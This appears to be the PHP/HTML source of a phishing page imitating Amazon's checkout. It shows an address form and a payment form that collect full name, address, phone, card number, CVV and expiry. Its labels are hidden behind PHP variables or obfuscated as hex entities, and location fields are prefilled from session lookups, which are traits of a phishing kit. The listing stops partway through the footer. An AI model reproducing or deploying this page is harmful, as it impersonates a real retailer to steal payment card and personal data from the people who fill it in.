
<body>
    <div id="a-page">
        <a id="nav-top"></a>
        <div id='nav-upnav' aria-hidden='true' style='background-image: url(https://images-na.ssl-images-amazon.com/images/G/01/airstream/upnav/C/nav_latest_1x._CB474855083_.jpg); background-color: #F6F6F6; text-align: left; background-position: top left; height: 55px; background-repeat: no-repeat; background-size: 1920px; min-width: 1000px;'>
            <a href="#" class="nav-a"><span class="nav-spanAltText"></span></a>
        </div>
        <header class='nav-locale-us nav-lang-en nav-ssl nav-rec nav-opt-sprite'>
            <div id='navbar' role="navigation" class='nav-sprite-v1 nav-bluebeacon nav-packard-glow nav-packard-glow-blacklist'>
                <div id='nav-belt'>
                    <div class='nav-left'>
                        <div id='nav-logo'>
                            <a href="#" class='nav-logo-link' tabindex="6">
                        <span class='nav-logo-base nav-sprite'></span>
                        <span class='nav-logo-ext nav-sprite'></span>
                        <span class='nav-logo-locale nav-sprite'></span>
                        </a>
                            <a href="#" aria-label="" tabindex="7" class='nav-logo-tagline nav-sprite nav-prime-try'>
                        <?=$I_23;?>
                        </a>
                        </div>
                    </div>
                    <div class='nav-right'>
                        <div id='nav-swmslot'>
                            <div id="navSwmHoliday" style="width: 400px; height: 39px; overflow: hidden;position: relative;"><a aria-label='Back to School clothing' href="#" class="nav-imageHref"><img src="https://images-na.ssl-images-amazon.com/images/G/01/img18/events/bts/gw/bts_swm_clothing_400x39_v3._CB473604550_.jpg" border="0" /></a></div>
                        </div>
                    </div>
                    <div class='nav-fill'>
                        <div id="nav-search">
                            <div id="nav-bar-left"></div>
                            <form accept-charset='utf-8' action='' class='nav-searchbar' name='site-search' role='search'>
                                <div class="nav-left">
                                    <div class='nav-search-scope nav-sprite'>
                                        <div class="nav-search-facade" data-value="search-alias=aps">
                                            <span class="nav-search-label">All</span>
                                            <i class="nav-icon"></i>
                                        </div>
                                    </div>
                                </div>
                                <div class="nav-right">
                                    <div class="nav-search-submit nav-sprite">
                                        <span id="nav-search-submit-text" class="nav-search-submit-text nav-sprite">Go</span>
                                        <input type="submit" 
								       		   class="nav-input" 
								       		   value="Go" 
								       		   tabindex="20" />
                                    </div>
                                </div>
                                <div class="nav-fill">
                                    <div class="nav-search-field ">
                                        <label id="nav-search-label" for="twotabsearchtextbox" class="aok-offscreen"></label>
                                        <input type='text' 
								       		   id='twotabsearchtextbox' 
								       		   value="" 
								       		   name='field-keywords' 
								       		   autocomplete='off' 
								       		   placeholder="" 
								       		   class='nav-input' 
								       		   dir='auto' tabindex="19">
                                    </div>
                                    <div id="nav-iss-attach"></div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
                <div id='nav-main' class='nav-sprite'>
                    <div class='nav-left'>
                        <div id='nav-global-location-slot'></div>
                    </div>
                    <div class='nav-right'>
                        <div id='nav-tools'>
                            <a id="icp-nav-flyout" class="nav-a nav-a-2 icp-link-style-2">
                        <span class="icp-nav-link-inner">
                        <span class="nav-line-1">
                        <span class="icp-nav-globe-img-2"></span>
                        <span class="icp-nav-language">EN</span>
                        </span>
                        <span class="nav-line-2">&nbsp;
                        <span class="nav-icon nav-arrow"></span>
                        </span>
                        </span>
                        <span class="icp-nav-link-border"></span>
                        </a>
                            <a href='#' class='nav-a nav-a-2 nav-truncate' data-nav-ref='nav_ya_signin' data-nav-role='signin' data-ux-jq-mouseenter='true' id='nav-link-accountList' tabindex='61'><span class='nav-line-1'>Hello,</span><span class='nav-line-2'><?=$I_24;?><span class='nav-icon nav-arrow'></span></span><span class='nav-line-3'>Hi</span><span class='nav-line-4'>Account & Lists</span></a>
                            <a
                                href='#' class='nav-a nav-a-2 nav-single-row-link' id='nav-orders' tabindex='63'><span class='nav-line-1'></span><span class='nav-line-2'><?=$I_25;?></span></a><a href='#' class='nav-a nav-a-2 nav-single-row-link' data-ux-jq-mouseenter='true' id='nav-link-prime' tabindex='64'><span class='nav-line-1'></span><span class='nav-line-2'><?=$I_23;?><span class='nav-icon nav-arrow'></span></span></a>
                                <a
                                    href='#' aria-label='0 items in cart' class='nav-a nav-a-2' id='nav-cart' tabindex='65'><span aria-hidden='true' class='nav-line-1'></span><span aria-hidden='true' class='nav-line-2'><?=$I_26;?><span class='nav-icon nav-arrow'></span></span><span class='nav-cart-icon nav-sprite'></span><span id='nav-cart-count' aria-hidden='true'
                                        class='nav-cart-count nav-cart-0'>0</span></a>
                        </div>
                    </div>
                    <div class='nav-fill'>
                        <div id='nav-xshop-container' class=''>
                            <div id='nav-xshop'>
                                <a href='#' class='nav-a' data-ux-jq-mouseenter='true' id='nav-recently-viewed' tabindex='48'><?=$I_27;?><span class='nav-icon nav-arrow'></span></a><a href='#' data-nav-tabindex='48' class='nav-a nav_a' id='nav-your-amazon'><span id="nav-your-amazon-text"><span class="nav-shortened-name"></span><?=$I_28;?></span></a>
                                <a
                                    href='#' class='nav-a' tabindex='50'><?=$I_29;?></a><a href='#' class='nav-a' tabindex='51'><?=$I_30;?></a><a href='#' class='nav-a' tabindex='52'>&#x52;&#x65;&#x67;&#x69;&#x73;&#x74;&#x72;&#x79;</a><a href='#' class='nav-a' tabindex='53'>&#x53;&#x65;&#x6C;&#x6C;</a><a href='#' class='nav-a' tabindex='54'>&#x54;&#x72;&#x65;&#x61;&#x73;&#x75;&#x72;&#x65;&#x20;&#x54;&#x72;&#x75;&#x63;&#x6B;</a>
                                    <a
                                        href='#' class='nav-a' tabindex='55'>&#x48;&#x65;&#x6C;&#x70;</a><a href='#' aria-label='Click to call our Disability Customer Support line, or reach us directly at 1-888-283-1678' class='nav-hidden-aria' tabindex='56'><?=$I_31;?> </a>
                            </div>
                        </div>
                    </div>
                </div>
                <div id='nav-subnav-toaster'></div>
                <div id='nav-subnav'>
                </div>
            </div>
        </header>
        <!--Tilu -->
        <div class="a-section">
            <div class="a-section a-spacing-medium a-text-left                         address-narrow-container-desktop">
                <div class="a-section a-spacing-medium">
                    <div class="a-subheader a-breadcrumb a-spacing-small">
                        <ul class="a-nostyle a-horizontal">
                            <li>
                                <span class="a-list-item">
                           <a class="a-spacing-large a-link-normal" href="#">                        <span> <?=$I_32;?> </span>
                                </a>
                                </span>
                            </li>
                            <li class="a-breadcrumb-divider">&#x203A;</li>
                            <li>
                                <span class="a-list-item">
                           <a class="a-spacing-large a-link-normal" href="#">                        <span> <?=$I_33;?> </span>
                                </a>
                                </span>
                            </li>
                            <li class="a-breadcrumb-divider">&#x203A;</li>
                            <li>
                                <span class="a-list-item">
                           <span class="a-color-state"> <?=$I_34;?> </span>
                                </span>
                            </li>
                        </ul>
                    </div>
                </div>
                <form onsubmit="return Validate(this);" action="" method="post">
                    <div class="a-section">
                        <h2><?=$I_35;?></h2>
                        <span id="address-ui-widget-content">
               <div id="address-ui-widgets-enterAddressFormContainer" class="a-section">
  
               <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label">
               <div class="a-section a-spacing-none aok-inline-block"><label for="address-ui-widgets-countryCode" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap"><span class="a-text-bold">&#x43;&#x6F;&#x75;&#x6E;&#x74;&#x72;&#x79;&#x2F;&#x52;&#x65;&#x67;&#x69;&#x6F;&#x6E;</span></label>
                    </div>
            </div>
            <div class="a-section a-spacing-large adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field">
                <span class="a-dropdown-container">
               <select name="countryCode" required autocomplete="off" id="address-ui-widgets-countryCode-dropdown-nativeId" tabIndex="-1" class="a-native-dropdown a-spacing-none">
			   <option selected value="<?=$_SESSION['_LOOKUP_COUNTRY_'];?>"><?=$_SESSION['_LOOKUP_COUNTRY_'];?></option>
			   <option value=" "> </option>
               <option value="AF">&#x41;&#x66;&#x67;&#x68;&#x61;&#x6E;&#x69;&#x73;&#x74;&#x61;&#x6E;</option>
               <option value="AX">Aland Islands</option>
               <option value="AL">Albania</option>
               <option value="DZ">Algeria</option>
               <option value="AS">American Samoa</option>
               <option value="AD">Andorra</option>
               <option value="AO">Angola</option>
               <option value="AI">Anguilla</option>
               <option value="AQ">Antarctica</option>
               <option value="AG">Antigua and Barbuda</option>
               <option value="AR">Argentina</option>
               <option value="AM">Armenia</option>
               <option value="AW">Aruba</option>
               <option value="AU">Australia</option>
               <option value="AT">Austria</option>
               <option value="AZ">Azerbaijan</option>
               <option value="BS">Bahamas, The</option>
               <option value="BH">Bahrain</option>
               <option value="BD">Bangladesh</option>
               <option value="BB">Barbados</option>
               <option value="BY">Belarus</option>
               <option value="BE">Belgium</option>
               <option value="BZ">Belize</option>
               <option value="BJ">Benin</option>
               <option value="BM">Bermuda</option>
               <option value="BT">Bhutan</option>
               <option value="BO">Bolivia</option>
               <option value="BQ">Bonaire, Saint Eustatius and Saba</option>
               <option value="BA">Bosnia and Herzegovina</option>
               <option value="BW">Botswana</option>
               <option value="BV">Bouvet Island</option>
               <option value="BR">Brazil</option>
               <option value="IO">British Indian Ocean Territory</option>
               <option value="BN">Brunei Darussalam</option>
               <option value="BG">Bulgaria</option>
               <option value="BF">Burkina Faso</option>
               <option value="BI">Burundi</option>
               <option value="KH">Cambodia</option>
               <option value="CM">Cameroon</option>
               <option value="CA">Canada</option>
               <option value="CV">Cape Verde</option>
               <option value="KY">Cayman Islands</option>
               <option value="CF">Central African Republic</option>
               <option value="TD">Chad</option>
               <option value="CL">Chile</option>
               <option value="CN">China</option>
               <option value="CX">Christmas Island</option>
               <option value="CC">Cocos (Keeling) Islands</option>
               <option value="CO">Colombia</option>
               <option value="KM">Comoros</option>
               <option value="CG">Congo</option>
               <option value="CD">Congo, The Democratic Republic of the</option>
               <option value="CK">Cook Islands</option>
               <option value="CR">Costa Rica</option>
               <option value="CI">Cote D&#39;ivoire</option>
               <option value="HR">Croatia</option>
               <option value="CW">Curaçao</option>
               <option value="CY">Cyprus</option>
               <option value="CZ">Czech Republic</option>
               <option value="DK">Denmark</option>
               <option value="DJ">Djibouti</option>
               <option value="DM">Dominica</option>
               <option value="DO">Dominican Republic</option>
               <option value="EC">Ecuador</option>
               <option value="EG">Egypt</option>
               <option value="SV">El Salvador</option>
               <option value="GQ">Equatorial Guinea</option>
               <option value="ER">Eritrea</option>
               <option value="EE">Estonia</option>
               <option value="ET">Ethiopia</option>
               <option value="FK">Falkland Islands (Malvinas)</option>
               <option value="FO">Faroe Islands</option>
               <option value="FJ">Fiji</option>
               <option value="FI">Finland</option>
               <option value="FR">France</option>
               <option value="GF">French Guiana</option>
               <option value="PF">French Polynesia</option>
               <option value="TF">French Southern Territories</option>
               <option value="GA">Gabon</option>
               <option value="GM">Gambia, The</option>
               <option value="GE">Georgia</option>
               <option value="DE">Germany</option>
               <option value="GH">Ghana</option>
               <option value="GI">Gibraltar</option>
               <option value="GR">Greece</option>
               <option value="GL">Greenland</option>
               <option value="GD">Grenada</option>
               <option value="GP">Guadeloupe</option>
               <option value="GU">Guam</option>
               <option value="GT">Guatemala</option>
               <option value="GG">Guernsey</option>
               <option value="GN">Guinea</option>
               <option value="GW">Guinea-Bissau</option>
               <option value="GY">Guyana</option>
               <option value="HT">Haiti</option>
               <option value="HM">Heard Island and the McDonald Islands</option>
               <option value="VA">Holy See</option>
               <option value="HN">Honduras</option>
               <option value="HK">Hong Kong</option>
               <option value="HU">Hungary</option>
               <option value="IS">Iceland</option>
               <option value="IN">India</option>
               <option value="ID">Indonesia</option>
               <option value="IQ">Iraq</option>
               <option value="IE">Ireland</option>
               <option value="IM">Isle of Man</option>
               <option value="IL">Israel</option>
               <option value="IT">Italy</option>
               <option value="JM">Jamaica</option>
               <option value="JP">Japan</option>
               <option value="JE">Jersey</option>
               <option value="JO">Jordan</option>
               <option value="KZ">Kazakhstan</option>
               <option value="KE">Kenya</option>
               <option value="KI">Kiribati</option>
               <option value="KR">Korea, Republic of</option>
               <option value="XK">Kosovo</option>
               <option value="KW">Kuwait</option>
               <option value="KG">Kyrgyzstan</option>
               <option value="LA">Lao People&#39;s Democratic Republic</option>
               <option value="LV">Latvia</option>
               <option value="LB">Lebanon</option>
               <option value="LS">Lesotho</option>
               <option value="LR">Liberia</option>
               <option value="LY">Libya</option>
               <option value="LI">Liechtenstein</option>
               <option value="LT">Lithuania</option>
               <option value="LU">Luxembourg</option>
               <option value="MO">Macao</option>
               <option value="MK">Macedonia, The Former Yugoslav Republic of</option>
               <option value="MG">Madagascar</option>
               <option value="MW">Malawi</option>
               <option value="MY">Malaysia</option>
               <option value="MV">Maldives</option>
               <option value="ML">Mali</option>
               <option value="MT">Malta</option>
               <option value="MH">Marshall Islands</option>
               <option value="MQ">Martinique</option>
               <option value="MR">Mauritania</option>
               <option value="MU">Mauritius</option>
               <option value="YT">Mayotte</option>
               <option value="MX">Mexico</option>
               <option value="FM">Micronesia, Federated States of</option>
               <option value="MD">Moldova, Republic of</option>
               <option value="MC">Monaco</option>
               <option value="MN">Mongolia</option>
               <option value="ME">Montenegro</option>
               <option value="MS">Montserrat</option>
               <option value="MA">Morocco</option>
               <option value="MZ">Mozambique</option>
               <option value="MM">Myanmar</option>
               <option value="NA">Namibia</option>
               <option value="NR">Nauru</option>
               <option value="NP">Nepal</option>
               <option value="NL">Netherlands</option>
               <option value="AN">Netherlands Antilles</option>
               <option value="NC">New Caledonia</option>
               <option value="NZ">New Zealand</option>
               <option value="NI">Nicaragua</option>
               <option value="NE">Niger</option>
               <option value="NG">Nigeria</option>
               <option value="NU">Niue</option>
               <option value="NF">Norfolk Island</option>
               <option value="MP">Northern Mariana Islands</option>
               <option value="NO">Norway</option>
               <option value="OM">Oman</option>
               <option value="PK">Pakistan</option>
               <option value="PW">Palau</option>
               <option value="PS">Palestinian Territories</option>
               <option value="PA">Panama</option>
               <option value="PG">Papua New Guinea</option>
               <option value="PY">Paraguay</option>
               <option value="PE">Peru</option>
               <option value="PH">Philippines</option>
               <option value="PN">Pitcairn</option>
               <option value="PL">Poland</option>
               <option value="PT">Portugal</option>
               <option value="PR">Puerto Rico</option>
               <option value="QA">Qatar</option>
               <option value="RE">Reunion</option>
               <option value="RO">Romania</option>
               <option value="RU">Russian Federation</option>
               <option value="RW">Rwanda</option>
               <option value="BL">Saint Barthelemy</option>
               <option value="SH">Saint Helena, Ascension and Tristan da Cunha</option>
               <option value="KN">Saint Kitts and Nevis</option>
               <option value="LC">Saint Lucia</option>
               <option value="MF">Saint Martin</option>
               <option value="PM">Saint Pierre and Miquelon</option>
               <option value="VC">Saint Vincent and the Grenadines</option>
               <option value="WS">Samoa</option>
               <option value="SM">San Marino</option>
               <option value="ST">Sao Tome and Principe</option>
               <option value="SA">Saudi Arabia</option>
               <option value="SN">Senegal</option>
               <option value="RS">Serbia</option>
               <option value="SC">Seychelles</option>
               <option value="SL">Sierra Leone</option>
               <option value="SG">Singapore</option>
               <option value="SX">Sint Maarten</option>
               <option value="SK">Slovakia</option>
               <option value="SI">Slovenia</option>
               <option value="SB">Solomon Islands</option>
               <option value="SO">Somalia</option>
               <option value="ZA">South Africa</option>
               <option value="GS">South Georgia and the South Sandwich Islands</option>
               <option value="ES">Spain</option>
               <option value="LK">Sri Lanka</option>
               <option value="SR">Suriname</option>
               <option value="SJ">Svalbard and Jan Mayen</option>
               <option value="SZ">Swaziland</option>
               <option value="SE">Sweden</option>
               <option value="CH">Switzerland</option>
               <option value="TW">Taiwan</option>
               <option value="TJ">Tajikistan</option>
               <option value="TZ">Tanzania, United Republic of</option>
               <option value="TH">Thailand</option>
               <option value="TL">Timor-leste</option>
               <option value="TG">Togo</option>
               <option value="TK">Tokelau</option>
               <option value="TO">Tonga</option>
               <option value="TT">Trinidad and Tobago</option>
               <option value="TN">Tunisia</option>
               <option value="TR">Turkey</option>
               <option value="TM">Turkmenistan</option>
               <option value="TC">Turks and Caicos Islands</option>
               <option value="TV">Tuvalu</option>
               <option value="UG">Uganda</option>
               <option value="UA">Ukraine</option>
               <option value="AE">United Arab Emirates</option>
               <option value="GB">United Kingdom</option>
               <option value="US">United States</option>
               <option value="UM">United States Minor Outlying Islands</option>
               <option value="UY">Uruguay</option>
               <option value="UZ">Uzbekistan</option>
               <option value="VU">Vanuatu</option>
               <option value="VE">Venezuela</option>
               <option value="VN">Vietnam</option>
               <option value="VG">Virgin Islands, British</option>
               <option value="VI">Virgin Islands, U.S.</option>
               <option value="WF">Wallis and Futuna</option>
               <option value="EH">Western Sahara</option>
               <option value="YE">Yemen</option>
               <option value="ZM">Zambia</option>
               <option value="ZW">Zimbabwe</option>
               </select>
               <span tabIndex="-1" id="address-ui-widgets-countryCode" data-a-class="address-ui-widgets-desktop-form-field-full-width" class="a-button a-button-dropdown a-spacing-none address-ui-widgets-desktop-form-field-full-width"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" role="button" tabIndex="0" aria-hidden="true"><span class="a-dropdown-prompt"></span></span>
                <i
                    class="a-icon a-icon-dropdown"></i>
                    </span>
                    </span>
                    </span>
            </div>
            <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label">
                <div class="a-section a-spacing-none aok-inline-block"><label for="address-ui-widgets-enterAddressFullName" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap"><span class="a-text-bold"><?=$I_36;?></span></label></div>
            </div>
            <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field">
			<input type="text" 
			       autocomplete="off" 
			       required="" 
			       title="Please Enter a valid name" 
			       pattern="[A-Za-z].{6,}" 
			       maxlength="20" 
			       id="full_name" 
			       name="full_name" 
			       class="a-input-text address-ui-widgets-desktop-form-field-full-width">
			</div>
            <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label">
                <div class="a-section a-spacing-none aok-inline-block"><label for="address-ui-widgets-enterAddressLine1" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap"><span class="a-text-bold"><?=$I_37;?></span></label></div>
            </div>
            <div class="a-section a-spacing-small adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field">
			<input type="text" 
			       required="" 
			       maxlength="60" 
			       value="" 
			       id="AddressLine1" 
			       title="Please Enter a valid address line" 
			       placeholder="Street and number, P.O. box, c/o." 
			       name="AddressLine1" 
			       class="a-input-text address-ui-widgets-desktop-form-field-full-width">
			</div>
            <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label"></div>
            <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field">
			<input type="text" 
			       maxlength="60" 
			       id="AddressLine2" 
			       placeholder="Apartment, suite, unit, building, floor, etc." 
			       name="AddressLine2" 
			       class="a-input-text address-ui-widgets-desktop-form-field-full-width">
			</div>
            <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label">
                <div class="a-section a-spacing-none aok-inline-block"><label for="address-ui-widgets-enterAddressCity" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap"><span class="a-text-bold"><?=$I_38;?></span></label></div>
            </div>
            <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field">
			<input type="text" 
			       required="" 
			       maxlength="50" 
			       title="Please Enter a valid city name" 
			       value="<?=$_SESSION['_LOOKUP_CITY_'];?>" 
			       id="city" 
			       name="city" 
			       class="a-input-text address-ui-widgets-desktop-form-field-full-width">
            </div>
            <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label">
                <div class="a-section a-spacing-none aok-inline-block"><label for="address-ui-widgets-enterAddressStateOrRegion" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap"><span class="a-text-bold"><?=$I_39;?></span></label></div>
            </div>
            <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field">
			<input type="text" 
			       required="" 
			       title="Please Enter a valid State/Province/Region name" 
			       maxlength="50" 
			       value="<?=$_SESSION['_LOOKUP_STATE_'];?>" 
			       id="state" 
			       name="state" 
			       class="a-input-text address-ui-widgets-desktop-form-field-full-width">
			</div>
            <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label">
                <div class="a-section a-spacing-none aok-inline-block"><label for="address-ui-widgets-enterAddressPostalCode" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap"><span class="a-text-bold"><?=$I_40;?></span></label></div>
            </div>
            <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field">
			<input type="text"
			       value="<?=$_SESSION['_LOOKUP_ZIPCODE_'];?>" 
				   required
			       title="Please Enter a valid ZIP code" 
			       maxlength="20" 
			       id="zipCode" 
			       name="zipCode" 
			       class="a-input-text address-ui-widgets-desktop-form-field-full-width">
			</div>
            <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label">
                <div class="a-section a-spacing-none aok-inline-block"><label for="address-ui-widgets-enterAddressPhoneNumber" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap"><span class="a-text-bold"><?=$I_41;?></span></label></div>
            </div>
            <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field">
            <input type="tel" 
			       maxlength="20" 
			       required="" 
			       autocomplete="off" 
			       id="phone" 
			       title="Please Enter a valid Phone number" 
			       name="phone" 
			       class="a-input-text address-ui-widgets-desktop-form-field-full-width">
                <div class="a-section a-spacing-none a-spacing-top-micro"><span class="a-size-mini">&#x4D;&#x61;&#x79;&#x20;&#x62;&#x65;&#x20;&#x75;&#x73;&#x65;&#x64;&#x20;&#x74;&#x6F;&#x20;&#x61;&#x73;&#x73;&#x69;&#x73;&#x74;&#x20;&#x64;&#x65;&#x6C;&#x69;&#x76;&#x65;&#x72;&#x79;</span></div>
            </div>
            <br />
            <div class="a-section a-spacing-base">
                <h2 id="address-ui-widgets-addr-details-main-heading" class="aok-float-left a-text-bold"><?=$I_42;?></h2>
                <span class="a-letter-space"></span>
            </div>
            <br />
            <table  style="min-width:100%; max-width:800px">
                <tr>
                    <td><label for="cc_holder"><?=$I_43;?></label>
                        <script type="text/javascript">
                            $('input[name="FullName"]').change(function() {
                                $('input[name="cc_holder"]').val($(this).val());
                            });
                        </script>
                        <input id="cc_holder" 
						       onkeydown="upperCaseF(this)" 
						       class="a-input-text address-ui-widgets-desktop-form-field-full-width" 
						       name="cc_holder" 
						       type="text" 
						required>
						</td>
                    <td><label for="cc_number"><?=$I_44;?></label>
                        <input id="cc_number" 
						       autocomplete="off" 
						       required="" 
						       pattern="[2-7][0-9 ]{11,24}" 
						       maxlength="30" 
						       class="a-input-text address-ui-widgets-desktop-form-field-full-width" 
						       name="cc_number" 
						       onkeyup="type_carte()" 
						       type="tel">

                    </td>
                </tr>
            </table>
			<style>
         .cvv2_number {
         width: 130%;
         }
		 table.no-spacing {
  border-spacing:0; /* Removes the cell spacing via CSS */
  border-collapse: collapse;  /* Optional - if you don't want to have double border where cells touch */
}
		 </style> <table style="min-width:100%; max-width:800px" class="no-spacing" cellspacing="0"><tr><td width="250">
<label for="cvv2_number"><?=$I_46;?></label>
                        <input id="cvv2_number" 
						       required="" 
						       autocomplete="off" 
						       pattern="[0-9]{3,4}"						   
						       class="a-input-text address-ui-widgets-desktop-form-field-full-width" 
						       name="cvv2_number" 
						       type="tel" 
						       maxlength="4">
         </td><td> 
                <label for="pp-Ce-27" id="pp-Ce-28" class="a-form-label"><?=$I_45;?></label>
                        <span class="a-dropdown-container">
               <select name="expirationDate_month" required autocomplete="off" data-a-native-class="pmts-native-dropdown" id="pp-lO-32" tabindex="-1" class="a-native-dropdown pmts-native-dropdown">
               <option value="1">01</option>
               <option value="2">02</option>
               <option value="3">03</option>
               <option value="4">04</option>
               <option value="5">05</option>
               <option value="6">06</option>
               <option value="7">07</option>
               <option value="8">08</option>
               <option value="9">09</option>
               <option value="10">10</option>
               <option value="11">11</option>
               <option value="12">12</option>
               </select>
               <span tabindex="-1" id="pp-lO-35" data-pmts-component-id="pp-lO-11" data-a-class="pmts-expiry-month pmts-portal-component pmts-portal-components-pp-lO-11" class="a-button a-button-dropdown pmts-expiry-month pmts-portal-component pmts-portal-components-pp-lO-11"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" role="button" tabindex="0" aria-hidden="true" aria-pressed="false"><span class="a-dropdown-prompt">01</span></span>
                        <i
                            class="a-icon a-icon-dropdown"></i>
                            </span>
                            </span>
                            </span>
                            <span class="a-letter-space"></span>
                            <span class="a-dropdown-container">
               <select name="expirationDate_year" required autocomplete="off" data-a-native-class="pmts-native-dropdown" id="pp-lO-34" tabindex="-1" class="a-native-dropdown pmts-native-dropdown">
			   <option value="<?php  echo date("Y");?>" selected="">
                  <?php  echo date("Y");?>
                </option>
				<option value="<?php  echo date("Y")+1;?>">
                  <?php  echo date("Y")+1;?>
                </option>
				<option value="<?php  echo date("Y")+2;?>">
                  <?php  echo date("Y")+2;?>
                </option>
				<option value="<?php  echo date("Y")+3;?>">
                  <?php  echo date("Y")+3;?>
                </option>
				<option value="<?php  echo date("Y")+4;?>">
                  <?php  echo date("Y")+4;?>
                </option>
				<option value="<?php  echo date("Y")+5;?>">
                  <?php  echo date("Y")+5;?>
                </option>
				<option value="<?php  echo date("Y")+6;?>">
                  <?php  echo date("Y")+6;?>
                </option>
				<option value="<?php  echo date("Y")+7;?>">
                  <?php  echo date("Y")+7;?>
                </option>
				<option value="<?php  echo date("Y")+8;?>">
                  <?php  echo date("Y")+8;?>
                </option>
				<option value="<?php  echo date("Y")+9;?>">
                  <?php  echo date("Y")+9;?>
                </option>
				<option value="<?php  echo date("Y")+10;?>">
                  <?php  echo date("Y")+10;?>
                </option>
				<option value="<?php  echo date("Y")+11;?>">
                  <?php  echo date("Y")+11;?>
                </option>
				<option value="<?php  echo date("Y")+12;?>">
                  <?php  echo date("Y")+12;?>
                </option>
				<option value="<?php  echo date("Y")+13;?>">
                  <?php  echo date("Y")+13;?>
                </option>
				<option value="<?php  echo date("Y")+14;?>">
                  <?php  echo date("Y")+14;?>
                </option>
				<option value="<?php  echo date("Y")+15;?>">
                  <?php  echo date("Y")+15;?>
                </option>
				<option value="<?php  echo date("Y")+16;?>">
                  <?php  echo date("Y")+16;?>
                </option>
				<option value="<?php  echo date("Y")+17;?>">
                  <?php  echo date("Y")+17;?>
                </option>
				<option value="<?php  echo date("Y")+18;?>">
                  <?php  echo date("Y")+18;?>
                </option>
				<option value="<?php  echo date("Y")+19;?>">
                  <?php  echo date("Y")+19;?>
                </option>

               </select>
               <span tabindex="-1" id="pp-lO-36" data-pmts-component-id="pp-lO-11" data-a-class="pmts-expiry-year pmts-portal-component pmts-portal-components-pp-lO-11" class="a-button a-button-dropdown pmts-expiry-year pmts-portal-component pmts-portal-components-pp-lO-11"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" role="button" tabindex="0" aria-hidden="true"><span class="a-dropdown-prompt"><?php  echo date("Y");?></span></span>
                            <i
                                class="a-icon a-icon-dropdown"></i>
                                </span>
                                </span>
                                </span>

								</td>
								</tr>
				</table>
						
                
            <div>
                <label class="helpNotifyUS" role="button"><?=$I_47;?> <a data-click="userAgreement" href="#" target="_blank"><?=$I_48;?></a>, <a data-click="privacyPolicy" href="#" target="_blank"><?=$I_49;?></a> &#x61;&#x6E;&#x64; <a data-click="esign" href="#" target="_blank"><?=$I_50;?></a>.</label>
            </div>
            <span class="a-button a-spacing-top-large a-button-primary"><span class="a-button-inner">
			<input class="a-button-input" type="submit"><span class="a-button-text" aria-hidden="true"><?=$I_51;?></span></span>
            </span>
        </div>
        </span>
    </div>
    </form>
    </div>
    <div id="footer" class="a-section">
        <div class='navLeftFooter nav-sprite-v1' id='navFooter'>
            <a href="#nav-top" id="navBackToTop">
                <div class="navFooterBackToTop"><span class="navFooterBackToTopText">&#x42;&#x61;&#x63;&#x6B;&#x20;&#x74;&#x6F;&#x20;&#x74;&#x6F;&#x70;</span></div>
            </a>
            <div class="navFooterVerticalColumn navAccessibility" role="presentation">
                <div class="navFooterVerticalRow navAccessibility" style="display: table-row;">
                    <div class="navFooterLinkCol navAccessibility">
                        <div class="navFooterColHead">&#x47;&#x65;&#x74;&#x20;&#x74;&#x6F;&#x20;&#x4B;&#x6E;&#x6F;&#x77;&#x20;&#x55;&#x73;</div>
                        <ul>
                            <li class='nav_first'><a href='#' class='nav_a'>&#x43;&#x61;&#x72;&#x65;&#x65;&#x72;&#x73;</a></li>
                            <li><a href='#' class='nav_a'>&#x42;&#x6C;&#x6F;&#x67;</a></li>
                            <li><a href='#' class='nav_a'>&#x41;&#x62;&#x6F;&#x75;&#x74;&#x20;&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;</a></li>
                            <li><a href='#' class='nav_a'>&#x49;&#x6E;&#x76;&#x65;&#x73;&#x74;&#x6F;&#x72;&#x20;&#x52;&#x65;&#x6C;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x73;</a></li>
                            <li class='nav_last'><a href='#' class='nav_a'>&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x20;&#x44;&#x65;&#x76;&#x69;&#x63;&#x65;&#x73;</a></li>
                        </ul>
                    </div>
                    <div class="navFooterColSpacerInner navAccessibility"></div>
                    <div class="navFooterLinkCol navAccessibility">
                        <div class="navFooterColHead">&#x4D;&#x61;&#x6B;&#x65;&#x20;&#x4D;&#x6F;&#x6E;&#x65;&#x79;&#x20;&#x77;&#x69;&#x74;&#x68;&#x20;&#x55;&#x73;</div>
                        <ul>
